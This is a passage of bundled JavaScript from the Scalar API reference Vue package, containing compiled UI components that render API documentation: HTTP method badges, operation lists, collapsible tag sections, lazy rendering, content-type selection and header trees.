}), [["__scopeId", "data-v-817abeb3"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/HttpMethod/HttpMethod.vue.js
var HttpMethod_default = /* @__PURE__ */ defineComponent({
	__name: "HttpMethod",
	props: {
		as: {},
		property: {},
		short: { type: Boolean },
		method: {}
	},
	setup(__props) {
		const props = __props;
		/** Grabs the method info object which contains abbreviation, color, and background color etc */
		const httpMethodInfo = computed(() => getHttpMethodInfo(String(props.method || "")));
		/** Full method name */
		const normalized = computed(() => {
			if (typeof props.method !== "string" || !props.method.trim()) return "get";
			const method = props.method.trim();
			return isHttpMethod(method.toLowerCase()) ? method.toLowerCase() : method;
		});
		return (_ctx, _cache) => {
			return openBlock(), createBlock(resolveDynamicComponent(__props.as ?? "span"), {
				class: normalizeClass({ uppercase: unref(isHttpMethod)(normalized.value) }),
				style: normalizeStyle({ [__props.property || "color"]: httpMethodInfo.value.colorVar })
			}, {
				default: withCtx(() => [renderSlot(_ctx.$slots, "default"), createTextVNode(" " + toDisplayString(__props.short ? httpMethodInfo.value.short : normalized.value), 1)]),
				_: 3
			}, 8, ["class", "style"]);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/OperationsList/OperationsListItem.vue.js
var OperationsListItem_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "OperationsListItem",
	props: {
		operation: {},
		isCollapsed: { type: Boolean },
		eventBus: {}
	},
	setup(__props) {
		const pathOrTitle = computed(() => {
			if ("path" in __props.operation) return __props.operation.path;
			return __props.operation.title;
		});
		const isWebhook = (_operation) => _operation.type === "webhook";
		const { level: headingLevel } = useDocumentOutline("operation");
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("li", {
				key: __props.operation.id,
				class: "contents"
			}, [__props.isCollapsed ? (openBlock(), createBlock(unref(SectionHeaderTag_default), {
				key: 0,
				class: "sr-only",
				level: unref(headingLevel)
			}, {
				default: withCtx(() => [createTextVNode(toDisplayString(__props.operation.title) + " (Hidden) ", 1)]),
				_: 1
			}, 8, ["level"])) : createCommentVNode("", true), createBaseVNode("a", {
				class: "endpoint",
				onClick: _cache[0] || (_cache[0] = withModifiers(() => __props.eventBus?.emit("scroll-to:nav-item", { id: __props.operation.id }), ["prevent"]))
			}, [createVNode(unref(HttpMethod_default), {
				class: "endpoint-method items-center justify-end gap-2",
				method: __props.operation.method
			}, {
				default: withCtx(() => [isWebhook(__props.operation) ? (openBlock(), createBlock(unref(ScalarIconWebhooksLogo_default), {
					key: 0,
					class: "size-3.5",
					style: normalizeStyle({ color: unref(getHttpMethodInfo)(__props.operation.method).colorVar })
				}, null, 8, ["style"])) : createCommentVNode("", true)]),
				_: 1
			}, 8, ["method"]), createBaseVNode("span", { class: normalizeClass(["endpoint-path", { deprecated: __props.operation.isDeprecated }]) }, toDisplayString(pathOrTitle.value), 3)])]);
		};
	}
}), [["__scopeId", "data-v-d54500d7"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/OperationsList/OperationsList.vue.script.js
var _hoisted_1$49 = ["aria-label"];
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/OperationsList/OperationsList.vue.js
var OperationsList_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "OperationsList",
	props: {
		tag: {},
		eventBus: {}
	},
	setup(__props) {
		const { translate } = useLocalization();
		const operationsAndWebhooks = computed(() => {
			return __props.tag.children?.filter((child) => child.type === "operation" || child.type === "webhook") ?? [];
		});
		return (_ctx, _cache) => {
			return __props.tag.children && __props.tag.children?.length > 0 ? (openBlock(), createBlock(unref(ScalarCard_default), {
				key: 0,
				class: "endpoints-card"
			}, {
				default: withCtx(() => [createVNode(unref(ScalarCardHeader_default), { muted: "" }, {
					default: withCtx(() => [createVNode(ScreenReader_default, null, {
						default: withCtx(() => [createTextVNode(toDisplayString(__props.tag.title), 1)]),
						_: 1
					}), createTextVNode(" " + toDisplayString(__props.tag.isWebhooks ? unref(translate)("navigation.webhooks") : unref(translate)("navigation.operations")), 1)]),
					_: 1
				}), createVNode(unref(ScalarCardSection_default), { class: "custom-scroll max-h-[60vh]" }, {
					default: withCtx(() => [createBaseVNode("ul", {
						"aria-label": unref(translate)("navigation.endpoints", { name: __props.tag.title }),
						class: "endpoints"
					}, [(openBlock(true), createElementBlock(Fragment, null, renderList(operationsAndWebhooks.value, (operationOrWebhook) => {
						return openBlock(), createBlock(OperationsListItem_default, {
							key: operationOrWebhook.id,
							eventBus: __props.eventBus,
							operation: operationOrWebhook
						}, null, 8, ["eventBus", "operation"]);
					}), 128))], 8, _hoisted_1$49)]),
					_: 1
				})]),
				_: 1
			})) : createCommentVNode("", true);
		};
	}
}), [["__scopeId", "data-v-0315c99b"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Tags/components/TagSection.vue.js
var TagSection_default = /* @__PURE__ */ defineComponent({
	__name: "TagSection",
	props: {
		tag: {},
		headingLevel: { default: 1 },
		headerId: {},
		isCollapsed: { type: Boolean },
		eventBus: {}
	},
	setup(__props) {
		const { translate } = useLocalization();
		/**
		* AsyncAPI tags carry `asyncapi-channel` children instead of `operation`/`webhook`,
		* so they get a dedicated channel list rather than the (empty) operations card.
		*/
		const hasChannels = computed(() => __props.tag.children?.some((child) => child.type === "asyncapi-channel") ?? false);
		return (_ctx, _cache) => {
			return __props.tag ? (openBlock(), createBlock(unref(Section_default), {
				key: 0,
				id: __props.tag.id,
				role: "none",
				onIntersecting: _cache[1] || (_cache[1] = () => __props.eventBus?.emit("intersecting:nav-item", { id: __props.tag.id }))
			}, {
				default: withCtx(() => [
					createVNode(unref(SectionHeader_default), null, {
						default: withCtx(() => [createVNode(unref(Anchor_default), { onCopyAnchorUrl: _cache[0] || (_cache[0] = () => __props.eventBus?.emit("copy-url:nav-item", { id: __props.tag.id })) }, {
							default: withCtx(() => [createVNode(unref(SectionHeaderTag_default), {
								id: __props.headerId,
								level: __props.headingLevel
							}, {
								default: withCtx(() => [createTextVNode(toDisplayString(__props.tag.title) + " ", 1), __props.isCollapsed ? (openBlock(), createBlock(ScreenReader_default, { key: 0 }, {
									default: withCtx(() => [createTextVNode(" (" + toDisplayString(unref(translate)("navigation.collapsed")) + ") ", 1)]),
									_: 1
								})) : createCommentVNode("", true)]),
								_: 1
							}, 8, ["id", "level"])]),
							_: 1
						})]),
						_: 1
					}),
					createVNode(unref(SectionContent_default), null, {
						default: withCtx(() => [createVNode(unref(SectionColumns_default), null, {
							default: withCtx(() => [createVNode(unref(SectionColumn_default), null, {
								default: withCtx(() => [createVNode(unref(ScalarMarkdown_default), {
									clamp: __props.isCollapsed ? 7 : void 0,
									value: __props.tag?.description ?? "",
									withImages: ""
								}, null, 8, ["clamp", "value"])]),
								_: 1
							}), createVNode(unref(SectionColumn_default), null, {
								default: withCtx(() => [hasChannels.value ? (openBlock(), createBlock(ChannelsList_default, {
									key: 0,
									eventBus: __props.eventBus,
									tag: __props.tag
								}, null, 8, ["eventBus", "tag"])) : (openBlock(), createBlock(unref(OperationsList_default), {
									key: 1,
									eventBus: __props.eventBus,
									tag: __props.tag
								}, null, 8, ["eventBus", "tag"]))]),
								_: 1
							})]),
							_: 1
						})]),
						_: 1
					}),
					createVNode(unref(SpecificationExtension_default), { value: __props.tag.xKeys }, null, 8, ["value"])
				]),
				_: 1
			}, 8, ["id"])) : createCommentVNode("", true);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Tags/components/ModernLayout.vue.script.js
var _hoisted_1$48 = {
	key: 2,
	class: "contents divide-y"
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Tags/components/ModernLayout.vue.js
var ModernLayout_default$1 = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "ModernLayout",
	props: {
		tag: {},
		moreThanOneTag: { type: Boolean },
		isCollapsed: { type: Boolean },
		eventBus: {},
		nested: {
			type: Boolean,
			default: false
		}
	},
	setup(__props) {
		const { translate } = useLocalization();
		const headerId = useId();
		const moreThanOneDefaultTag = computed(() => __props.moreThanOneTag || __props.tag?.title !== "default" || __props.tag?.description !== "");
		const hasChildren = computed(() => (__props.tag?.children?.length ?? 0) > 0);
		/**
		* A lone top-level tag never collapses, because the whole reference would disappear with it.
		* A nested tag always has its parent as context, so it respects the collapsed state even
		* when it has no sibling tags.
		*/
		const respectsCollapse = computed(() => __props.moreThanOneTag || __props.nested);
		const sectionCollapsed = computed(() => __props.isCollapsed && respectsCollapse.value);
		const showMore = computed(() => sectionCollapsed.value && hasChildren.value);
		/** Nested sections remain transparent so only first-level tags establish a surface. */
		const hasCollapsedSurface = computed(() => showMore.value && !__props.nested);
		const { level: headingLevel } = useDocumentOutline("tag");
		return (_ctx, _cache) => {
			return openBlock(), createBlock(unref(SectionContainer_default), {
				"aria-labelledby": unref(headerId),
				class: normalizeClass(["tag-section-container", {
					"tag-section-collapsed": hasCollapsedSurface.value,
					"tag-section-nested": __props.nested
				}]),
				role: "region"
			}, {
				default: withCtx(() => [
					moreThanOneDefaultTag.value ? (openBlock(), createBlock(TagSection_default, {
						key: 0,
						headingLevel: unref(headingLevel),
						eventBus: __props.eventBus,
						headerId: unref(headerId),
						isCollapsed: __props.isCollapsed,
						tag: __props.tag
					}, null, 8, [
						"headingLevel",
						"eventBus",
						"headerId",
						"isCollapsed",
						"tag"
					])) : createCommentVNode("", true),
					showMore.value ? (openBlock(), createBlock(ShowMoreButton_default, {
						key: 1,
						id: __props.tag.id,
						"aria-label": unref(translate)("navigation.showAllEndpoints", { name: __props.tag.title }),
						onClick: _cache[0] || (_cache[0] = () => __props.eventBus?.emit("toggle:nav-item", {
							id: __props.tag.id,
							open: true
						}))
					}, null, 8, ["id", "aria-label"])) : createCommentVNode("", true),
					!sectionCollapsed.value ? (openBlock(), createElementBlock("div", _hoisted_1$48, [renderSlot(_ctx.$slots, "default", {}, void 0, true)])) : createCommentVNode("", true)
				]),
				_: 3
			}, 8, ["aria-labelledby", "class"]);
		};
	}
}), [["__scopeId", "data-v-b6a490f4"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Tags/Tag.vue.js
var Tag_default = /* @__PURE__ */ defineComponent({
	__name: "Tag",
	props: {
		tag: {},
		layout: {},
		moreThanOneTag: { type: Boolean },
		isCollapsed: { type: Boolean },
		eventBus: {},
		nested: { type: Boolean }
	},
	setup(__props) {
		return (_ctx, _cache) => {
			return __props.layout === "classic" ? (openBlock(), createBlock(ClassicLayout_default$1, {
				key: 0,
				eventBus: __props.eventBus,
				isCollapsed: __props.isCollapsed,
				layout: __props.layout,
				nested: __props.nested,
				tag: __props.tag
			}, {
				default: withCtx(() => [renderSlot(_ctx.$slots, "default")]),
				_: 3
			}, 8, [
				"eventBus",
				"isCollapsed",
				"layout",
				"nested",
				"tag"
			])) : (openBlock(), createBlock(ModernLayout_default$1, {
				key: 1,
				eventBus: __props.eventBus,
				isCollapsed: __props.isCollapsed,
				layout: __props.layout,
				moreThanOneTag: __props.moreThanOneTag,
				nested: __props.nested,
				tag: __props.tag
			}, {
				default: withCtx(() => [renderSlot(_ctx.$slots, "default")]),
				_: 3
			}, 8, [
				"eventBus",
				"isCollapsed",
				"layout",
				"moreThanOneTag",
				"nested",
				"tag"
			]));
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Lazy/Lazy.vue.script.js
var _hoisted_1$47 = ["id", "data-placeholder"];
var PLACEHOLDER_HEIGHT_PX = 760;
/** Overscan: render items within this many pixels above and below the viewport. */
var VIEWPORT_OVERSCAN_PX = 1200;
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Lazy/Lazy.vue.js
var Lazy_default = /* @__PURE__ */ defineComponent({
	__name: "Lazy",
	props: {
		id: {},
		expanded: {
			type: Boolean,
			default: false
		}
	},
	setup(__props) {
		/**
		* Lazily renders content when the element is within the viewport overscan.
		* Uses a fixed-height placeholder so layout is stable while we block during render.
		*
		* When server-side rendering, content renders immediately.
		*
		* @link https://medium.com/js-dojo/lazy-rendering-in-vue-to-improve-performance-dcccd445d5f
		*/
		/** Fixed height for all placeholders so we do not measure or jump. */
		const VIEWPORT_ROOT_MARGIN = `${VIEWPORT_OVERSCAN_PX}px 0px`;
		const { isReady } = useLazyBus(__props.id);
		const lazyContainerRef = ref(null);
		const placeholderHeight = ref(getLazyPlaceholderHeight(__props.id) ?? PLACEHOLDER_HEIGHT_PX);
		let contentResizeObserver = null;
		/** Once ready we always show (no eviction). Otherwise show when expanded (e.g. so child Lazy placeholders mount). */
		const shouldRender = computed(() => isReady.value || __props.expanded);
		onMounted(() => {
			if (typeof window === "undefined") return;
			if (!("IntersectionObserver" in window)) {
				requestLazyRender(__props.id, true);
				return;
			}
			useIntersectionObserver(lazyContainerRef, ([entry]) => {
				if (entry?.isIntersecting && !isReady.value) requestLazyRender(__props.id, true);
			}, { rootMargin: VIEWPORT_ROOT_MARGIN });
		});
		/**
		* Capture content height right before we switch to placeholder (pre-flush so content
		* is still in the DOM). Ensures we never measure the container or leave the cache stale.
		*/
		watch(() => shouldRender.value, (rendered, wasRendered) => {
			if (wasRendered && !rendered && lazyContainerRef.value) {
				const h = lazyContainerRef.value.offsetHeight;
				if (Number.isFinite(h) && h > 0) {
					placeholderHeight.value = h;
					setLazyPlaceholderHeight(__props.id, h);
				}
			}
		}, { flush: "pre" });
		/** When content is visible, set up ResizeObserver and measure. */
		watch(() => shouldRender.value, (rendered) => {
			if (!rendered) {
				contentResizeObserver?.disconnect();
				contentResizeObserver = null;
				return;
			}
			nextTick(() => {
				if (!lazyContainerRef.value || typeof ResizeObserver === "undefined") return;
				if (!contentResizeObserver) contentResizeObserver = new ResizeObserver(() => {
					if (!lazyContainerRef.value) return;
					const h = lazyContainerRef.value.offsetHeight;
					if (Number.isFinite(h) && h > 0) {
						placeholderHeight.value = h;
						setLazyPlaceholderHeight(__props.id, h);
					}
				});
				contentResizeObserver.observe(lazyContainerRef.value);
				const h = lazyContainerRef.value.offsetHeight;
				if (Number.isFinite(h) && h > 0) {
					placeholderHeight.value = h;
					setLazyPlaceholderHeight(__props.id, h);
				}
			});
		}, { immediate: true });
		onBeforeUnmount(() => {
			contentResizeObserver?.disconnect();
		});
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("div", {
				id: !shouldRender.value ? __props.id : void 0,
				ref_key: "lazyContainerRef",
				ref: lazyContainerRef,
				"data-placeholder": !shouldRender.value,
				"data-testid": "lazy-container",
				style: normalizeStyle({ height: shouldRender.value ? void 0 : `${placeholderHeight.value}px` })
			}, [shouldRender.value ? renderSlot(_ctx.$slots, "default", {}, void 0, void 0, 0) : createCommentVNode("", true)], 12, _hoisted_1$47);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Operation/components/ContentTypeSelect.vue.script.js
var _hoisted_1$46 = ["aria-label"];
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Operation/components/ContentTypeSelect.vue.js
var ContentTypeSelect_default = /* @__PURE__ */ defineComponent({
	inheritAttrs: false,
	__name: "ContentTypeSelect",
	props: /*@__PURE__*/ mergeModels({ content: {} }, {
		"modelValue": { required: true },
		"modelModifiers": {}
	}),
	emits: ["update:modelValue"],
	setup(__props) {
		const { translate } = useLocalization();
		/** The selected content type with two-way binding */
		const selectedContentType = useModel(__props, "modelValue");
		const contentTypes = computed(() => Object.keys(__props.content ?? {}));
		const selectedOption = computed({
			get: () => options.value.find((option) => option.id === selectedContentType.value),
			set: (option) => {
				if (option) selectedContentType.value = option.id;
			}
		});
		const options = computed(() => {
			return contentTypes.value.map((type) => ({
				id: type,
				label: type
			}));
		});
		const contentTypeSelect = cva({
			base: "font-normal text-c-2 bg-b-1 py-1 flex items-center gap-1 rounded-full text-xs leading-none border",
			variants: { dropdown: {
				true: "hover:text-c-1 pl-2 pr-1.5 font-medium cursor-pointer",
				false: "px-2"
			} }
		});
		return (_ctx, _cache) => {
			return contentTypes.value.length > 1 ? (openBlock(), createBlock(unref(ScalarListbox_default), {
				key: 0,
				modelValue: selectedOption.value,
				"onUpdate:modelValue": _cache[1] || (_cache[1] = ($event) => selectedOption.value = $event),
				options: options.value,
				placement: "bottom-end",
				teleport: "",
				onClick: _cache[2] || (_cache[2] = withModifiers(() => {}, ["stop"]))
			}, {
				default: withCtx(({ open }) => [createVNode(unref(ScalarButton_default), mergeProps({
					class: ["h-fit", unref(contentTypeSelect)({ dropdown: true })],
					variant: "ghost"
				}, _ctx.$attrs, { onClick: _cache[0] || (_cache[0] = withModifiers(() => {}, ["stop"])) }), {
					default: withCtx(() => [
						createVNode(ScreenReader_default, null, {
							default: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("operation.selectedContentType")) + ": ", 1)]),
							_: 1
						}),
						createBaseVNode("span", null, toDisplayString(selectedContentType.value), 1),
						createVNode(unref(ScalarIconCaretDown_default), {
							class: normalizeClass(["size-2.75 transition-transform duration-100", { "rotate-180": open }]),
							weight: "bold"
						}, null, 8, ["class"])
					]),
					_: 2
				}, 1040, ["class"])]),
				_: 1
			}, 8, ["modelValue", "options"])) : (openBlock(), createElementBlock("div", mergeProps({
				key: 1,
				"aria-label": unref(translate)("operation.selectedContentType"),
				class: ["selected-content-type", unref(contentTypeSelect)({ dropdown: false })],
				role: "group"
			}, _ctx.$attrs, { tabindex: "0" }), [createBaseVNode("span", null, toDisplayString(selectedContentType.value), 1)], 16, _hoisted_1$46));
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Operation/components/Header.vue.js
var Header_default = /* @__PURE__ */ defineComponent({
	__name: "Header",
	props: {
		header: {},
		name: {},
		breadcrumb: {},
		eventBus: {},
		document: {},
		orderSchemaPropertiesBy: {},
		orderRequiredPropertiesFirst: { type: Boolean },
		expandAllSchemaProperties: { type: Boolean },
		schemaKeyboardNav: { type: Boolean },
		hideModels: { type: Boolean }
	},
	setup(__props) {
		return (_ctx, _cache) => {
			return "schema" in __props.header && __props.header.schema ? (openBlock(), createBlock(SchemaProperty_default, {
				key: 0,
				breadcrumb: __props.breadcrumb,
				description: __props.header.description,
				eventBus: __props.eventBus,
				name: __props.name,
				options: {
					orderRequiredPropertiesFirst: __props.orderRequiredPropertiesFirst,
					orderSchemaPropertiesBy: __props.orderSchemaPropertiesBy,
					expandAllSchemaProperties: __props.expandAllSchemaProperties,
					schemaKeyboardNav: __props.schemaKeyboardNav,
					hideModels: __props.hideModels,
					document: __props.document
				},
				schema: unref(getResolvedRef)(__props.header.schema)
			}, null, 8, [
				"breadcrumb",
				"description",
				"eventBus",
				"name",
				"options",
				"schema"
			])) : createCommentVNode("", true);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Operation/components/Headers.vue.script.js
var _hoisted_1$45 = ["id"];
var _hoisted_2$29 = ["id"];
var _hoisted_3$21 = { role: "list" };
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Operation/components/Headers.vue.js
var Headers_default = /* @__PURE__ */ defineComponent({
	__name: "Headers",
	props: {
		headers: {},
		breadcrumb: {},
		eventBus: {},
		document: {},
		orderRequiredPropertiesFirst: { type: Boolean },
		orderSchemaPropertiesBy: {},
		expandAllSchemaProperties: { type: Boolean },
		schemaKeyboardNav: { type: Boolean },
		hideModels: { type: Boolean }
	},
	setup(__props) {
		const { translate } = useLocalization();
		const resolvedHeaders = computed(() => Object.fromEntries(Object.entries(__props.headers).flatMap(([name, header]) => {
			const resolved = getResolvedRef(header);
			return resolved ? [[name, resolved]] : [];
		})));
		/**
		* This group owns tree rows but sits beside the schema tree rather than inside
		* it, so arrow-key navigation only reaches its toggles when it delegates too.
		*/
		const onGroupKeydown = (event) => {
			if (__props.schemaKeyboardNav) handleTreeKeydown(event);
		};
		/**
		* Headers are a child group keyed into the expansion store like any other
		* node, so expand-all and deep links reach them.
		*/
		const expansion = useSchemaExpansion();
		const anonymousKey = useId();
		/** The public anchor path of the headers, unchanged so shared links resolve. */
		const headersBreadcrumb = computed(() => __props.breadcrumb ? [...__props.breadcrumb, "headers"] : void 0);
		/**
		* The `~` marker matches other structural segments (`~items`, `~anonymous-`);
		* without it the group collides with a body property named `headers`. The
		* anchor path goes to the store separately so deep links still open the group.
		*/
		const nodeKey = computed(() => (__props.breadcrumb ? toNodeKey([...__props.breadcrumb, "~headers"]) : "") || `~anonymous-${anonymousKey}`);
		const isOpen = computed(() => expansion.isExpanded(nodeKey.value, {
			defaultOpen: !!__props.expandAllSchemaProperties,
			anchorPath: toNodeKey(headersBreadcrumb.value)
		}));
		const panelId = useId();
		const nameId = useId();
		const countId = useId();
		const countLabel = computed(() => translate("schema.headerCount", { count: String(Object.keys(resolvedHeaders.value).length) }));
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("div", {
				class: "property property--tree headers-tree-group relative mt-1.5 py-1.5",
				onKeydown: onGroupKeydown
			}, [
				createVNode(SchemaGutterToggle_default, {
					class: "absolute start-[calc(0px_-_var(--schema-toggle-half,12px)_-_var(--schema-gutter,16px))] top-[calc(6px_+_0.5lh)] z-[1] -translate-y-1/2",
					countId: unref(countId),
					fallbackLabel: unref(translate)("operation.headers"),
					nameId: unref(nameId),
					open: isOpen.value,
					panelId: unref(panelId),
					panelRendered: isOpen.value,
					onToggle: _cache[0] || (_cache[0] = ($event) => unref(expansion).setExpanded(nodeKey.value, !isOpen.value))
				}, null, 8, [
					"countId",
					"fallbackLabel",
					"nameId",
					"open",
					"panelId",
					"panelRendered"
				]),
				createBaseVNode("div", {
					class: "property-heading cursor-pointer",
					onClick: _cache[1] || (_cache[1] = ($event) => unref(expansion).setExpanded(nodeKey.value, !isOpen.value))
				}, [createBaseVNode("span", {
					id: unref(nameId),
					class: "property-name font-code text-sm [font-weight:var(--scalar-bold)]"
				}, toDisplayString(unref(translate)("operation.headers")), 9, _hoisted_1$45)]),
				createBaseVNode("span", {
					id: unref(countId),
					class: "screenreader-only"
				}, toDisplayString(countLabel.value), 9, _hoisted_2$29),
				isOpen.value ? (openBlock(), createBlock(SchemaRailPanel_default, {
					key: 0,
					id: unref(panelId),
					class: "property-children mt-1.5 mb-0.5",
					closeOnRail: "",
					depth: 2,
					onClose: _cache[2] || (_cache[2] = ($event) => unref(expansion).setExpanded(nodeKey.value, false))
				}, {
					default: withCtx(() => [createBaseVNode("ul", _hoisted_3$21, [(openBlock(true), createElementBlock(Fragment, null, renderList(resolvedHeaders.value, (header, key) => {
						return openBlock(), createBlock(Header_default, {
							key,
							breadcrumb: headersBreadcrumb.value,
							document: __props.document,
							eventBus: __props.eventBus,
							expandAllSchemaProperties: __props.expandAllSchemaProperties,
							header,
							hideModels: __props.hideModels,
							name: key,
							orderRequiredPropertiesFirst: __props.orderRequiredPropertiesFirst,
							orderSchemaPropertiesBy: __props.orderSchemaPropertiesBy,
							schemaKeyboardNav: __props.schemaKeyboardNav
						}, null, 8, [
							"breadcrumb",
							"document",
							"eventBus",
							"expandAllSchemaProperties",
							"header",
							"hideModels",
							"name",
							"orderRequiredPropertiesFirst",
							"orderSchemaPropertiesBy",
							"schemaKeyboardNav"
						]);
					}), 128))])]),
					_: 1
				}, 8, ["id"])) : createCommentVNode("", true)
			], 32);
		};
	}
});
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Operation/components/helpers/get-parameter-examples.js
var filterUndefined = (example) => example !== void 0;
/**
* Build a normalized examples array from parameter/content/schema examples.
* Undefined values are removed so the UI does not render "undefined" entries.
*/
var getParameterExamples = ({ parameter, schemaExamples, contentExamples }) => {
	const paramExamples = "examples" in parameter && isObjectLike(parameter.examples) ? parameter.examples : {};
	if ("in" in parameter && parameter.in === "querystring") {
		const examples = Object.values({
			...isObjectLike(contentExamples) ? contentExamples : {},
			...paramExamples
		}).map((entry) => {
			const example = getResolvedRef(entry);
			if (!isObjectLike(example)) return example;
			return example.dataValue !== void 0 ? example.dataValue : example.serializedValue ?? example.value;
		}).filter(filterUndefined);
		if (examples.length) return examples.map((value) => ({ value }));
		return (parameter.example !== void 0 ? [parameter.example] : schemaExamples ?? []).filter(filterUndefined).map((value) => ({ value }));
	}
	const recordExamples = Object.values({
		...paramExamples,
		...isObjectLike(contentExamples) ? contentExamples : {}
	}).map((entry) => {
		const resolved = getResolvedRef(entry);
		if (isObjectLike(resolved) && ("dataValue" in resolved || "serializedValue" in resolved)) return { value: getExampleValue(resolved)?.value };
		return entry;
	}).filter(filterUndefined);
	const fallbackExample = recordExamples.length === 0 && "example" in parameter && parameter.example !== void 0 ? [parameter.example] : [];
	const arrayExamples = (schemaExamples ?? fallbackExample).filter(filterUndefined);
	return [...recordExamples, ...arrayExamples];
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Operation/components/ParameterListItem.vue.script.js
var _hoisted_1$44 = ["id"];
var _hoisted_2$28 = { class: "parameter-item-name min-w-0" };
var _hoisted_3$20 = { class: "text-c-2 text-xs" };
var _hoisted_4$12 = {
	key: 0,
	class: "text-c-danger text-xs"
};
var _hoisted_5$9 = {
	key: 2,
	class: "flex-1"
};
var _hoisted_6$8 = {
	key: 1,
	class: "text-c-2 text-sm"
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/features/Operation/components/ParameterListItem.vue.js
var ParameterListItem_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "ParameterListItem",
	props: {
		parameter: {},
		name: {},
		breadcrumb: {},
		eventBus: {},
		collapsableItems: { type: Boolean },
		document: {},
		options: {}
	},
	emits: ["update:selectedContentType"],
	setup(__props, { emit: __emit }) {
		const emit = __emit;
		const { translate } = useLocalization();
		/** Compact parameter rows also hide scalar details, unlike response rows. */
		const isCompactParameter = computed(() => Boolean(__props.collapsableItems) && "in" in __props.parameter);
		/** Whether the markdown summary is being truncated */
		const truncated = ref(false);
		/** Responses and params may both have a schema */
		const schema = computed(() => "schema" in __props.parameter && __props.parameter.schema ? getResolvedRef(__props.parameter.schema) ?? null : null);
		/** Response and params may both have content */
		const content = computed(() => {
			if (!("content" in __props.parameter) || !__props.parameter.content) return null;
			if (Object.keys(__props.parameter.content).length === 0) return null;
			return __props.parameter.content;
		});
		const selectedContentType = ref(Object.keys(content.value || {})[0] ?? "");
		/**
		* Report the selected content type upward so the example response panel can mirror it.
		* The parent decides whether the value is relevant (only response items are wired up),
		* so this item does not need to know whether it represents a response or a parameter.
		*/
		watch(selectedContentType, (type) => {
			emit("update:selectedContentType", type);
		});
		/** Response headers */
		const headers = computed(() => "headers" in __props.parameter && __props.parameter.headers ? __props.parameter.headers : null);
		/** Raw schema (possibly with $ref) for the selected content type or param. */
		const baseSchema = computed(() => content.value ? content.value?.[selectedContentType.value]?.schema ?? content.value?.[selectedContentType.value]?.itemSchema : "schema" in __props.parameter && __props.parameter.schema ? __props.parameter.schema : null);
		/** When the schema is a $ref, preserve its name so the UI can show the ref name instead of just the type. */
		const schemaModelName = computed(() => {
			const raw = baseSchema.value;
			if (!raw) return null;
			if ("$ref" in raw) return getRefName(raw.$ref);
			return null;
		});
		/** Computed value from the combined schema param and content param */
		const value = computed(() => {
			const base = baseSchema.value;
			const resolvedBase = content.value ? getResolvedRef(base) : schema.value;
			const deprecated = "deprecated" in __props.parameter ? __props.parameter.deprecated : schema.value?.deprecated;
			/** Combine param/content/schema examples while ignoring undefined values. */
			const examples = getParameterExamples({
				parameter: __props.parameter,
				schemaExamples: schema.value?.examples,
				contentExamples: content.value?.[selectedContentType.value]?.examples
			});
			return {
				...resolvedBase,
				deprecated,
				examples
			};
		});
		/** Composition keywords that render their members as nested rows. */
		const COMPOSITION_KEYWORDS = [
			"allOf",
			"oneOf",
			"anyOf",
			"not"
		];
		/**
		* Whether a resolved schema renders nested child rows — object members,
		* complex array items, or composition members. Scalar detail (format,
		* default, enum, examples) is information, not children.
		*
		* Must agree with what `SchemaProperty` renders: a mismatch either leaves a
		* subtree permanently expanded (children, no control) or draws a control
		* over an empty panel. Only the top-level schema is inspected — whether
		* children exist, not how deep they go, decides collapsibility — so there is no
		* `$ref` walk to recurse into and no cycle to guard against.
		*/
		const hasChildElements = (input) => {
			if (!input || typeof input !== "object") return false;
			const schemaObject = optimizeValueForDisplay(input) ?? input;
			if (("properties" in schemaObject || "additionalProperties" in schemaObject) && (schemaObject.properties || schemaObject.patternProperties || schemaObject.additionalProperties)) return true;
			if (COMPOSITION_KEYWORDS.some((keyword) => {
				const members = schemaObject[keyword];
				return Array.isArray(members) ? members.length > 0 : Boolean(members);
			})) return true;
			if (hasComplexArrayItems(schemaObject)) return true;
			return false;
		};
		/**
		* Whether this item renders as a collapsible disclosure.
		*
		* Response controls only hide child elements: media content, response headers,
		* or a schema with nested rows — never scalar detail, so a scalar-only
		* item renders statically. Compact parameters opt in to hiding scalar details.
		* `truncated` stays as an overflow escape
		* hatch: it only turns true when a summary is cut off, and a summary only
		* renders on a disclosure.
		*/
		const shouldCollapse = computed(() => Boolean(isCompactParameter.value && Boolean(__props.parameter.description || schema.value) || content.value || headers.value || hasChildElements(value.value) || truncated.value));
		/**
		* A collapsable-list item with nothing to collapse renders like a
		* non-collapsable one — no trigger, a static panel, and the schema showing
		* its own name and description.
		*/
		const isStaticTreeItem = computed(() => Boolean(__props.collapsableItems) && !shouldCollapse.value);
		/**
		* A collapsible row's panel becomes a railed panel with the DisclosurePanel
		* as its root, so the disclosure wiring is untouched. Non-collapsable and
		* static items keep the plain DisclosurePanel.
		*/
		const isRailedPanel = computed(() => Boolean(__props.collapsableItems) && shouldCollapse.value);
		/**
		* The breadcrumb passed to the schema. Collapsible items (responses) render their
		* schema without a name to avoid a duplicate heading, so we push the item name
